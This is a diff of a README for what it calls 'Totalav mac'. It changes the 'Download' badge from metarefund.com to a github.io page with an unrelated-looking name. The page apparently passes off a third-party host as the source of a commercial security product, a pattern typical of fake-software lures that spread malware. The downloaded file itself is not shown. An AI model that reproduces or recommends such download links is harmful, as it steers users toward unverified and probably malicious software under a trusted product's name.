@@ -2,7 +2,7 @@
 
 Totalav mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Totalav mac](https://img.shields.io/badge/Download-Totalav_mac-blueviolet)](https://metarefund.com/)
+[![Download Totalav mac](https://img.shields.io/badge/Download-Totalav_mac-blueviolet)](https://shalaliveoakptiwr.github.io/.github/Totalav-Labs)
 
 ---
 
